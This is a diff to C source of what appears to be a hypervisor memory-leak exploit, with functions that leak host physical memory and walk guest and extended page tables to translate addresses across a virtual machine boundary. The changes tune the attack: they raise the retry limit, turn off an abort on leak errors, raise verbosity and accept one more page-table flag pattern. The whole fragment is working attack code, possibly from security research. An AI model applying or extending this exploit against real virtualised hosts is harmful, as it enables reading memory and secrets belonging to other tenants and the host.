@@ -34,14 +34,14 @@ u64 leak64(hpa_t base, hpa_t pa)
 	if (verbose) {
 		u64 true = hc_read_pa(pa);
 		if (true != val) {
-			fprintf(stderr, "\n{leak64: leaked: %lx, true = %lx (%s)}\n", val, true, true != val ? "ERROR" : "OK");
+			fprintf(stderr, "\n{leak64 at pa=%lx: leaked: %lx, true = %lx (%s)}\n", pa, val, true, true != val ? "ERROR" : "OK");
 			if ((true ^ val) & val) {
 				fprintf(stderr, "\nUNRECONCILABLE ERROR!\n");
 				dump(true ^ val);
 				dump((true ^ val) & val);
 				fprintf(stderr, "NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
 				fprintf(stderr, "\n\n\n\n\n\n\n\n\n\n\n");
-				exit(1);
+				// exit(1);
 			}
 		}
 	}
@@ -83,7 +83,7 @@ hva_t leak_ptr(hpa_t base, hva_t dm, hpa_t pa, int (*check)(va_t, va_t))
 			return ptr;
 		if (verbose)
 			fprintf(stderr, "leak_ptr: retrying erronous ptr %lx\n", ptr);
-		if (++nr_tries_global >= 100)
+		if (++nr_tries_global >= 1000)
 			err(1, "leak_ptr(base=%lx, dm=%lx, pa=%lx): stuck! (%d)\n", base, dm, pa, nr_tries_global);
 	}
 
@@ -280,7 +280,7 @@ pa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp, int 
 	}
 	
 	fprintf(stderr, "translate_tdp(%lx)", va);
-	const int verbose = 1;
+	const int verbose = 2;
 	if (verbose >= 2) fprintf(stderr, "translate_tdp(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
 
@@ -402,8 +402,9 @@ retry_gpte:
 	pte_t gpte = leak_pte(base, pte_pa);
 	if (verbose == 1) { fprintf(stderr, "            \\ gpte %10lx", gpte); fflush(stdout); }
 	if (verbose >= 2) dump(gpte);
-	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825 || (gpte & 0xfff) == 0x805)) {
+	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825 || (gpte & 0xfff) == 0x805 || (gpte & 0xfff) == 0x867)) {
 		if (verbose == 1) fprintf(stderr, "\n");
+		if (verbose >= 2) fprintf(stderr, "\ngpte looks malformed... toto retry_gpte\n");
 		goto retry_gpte;
 	}
 	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
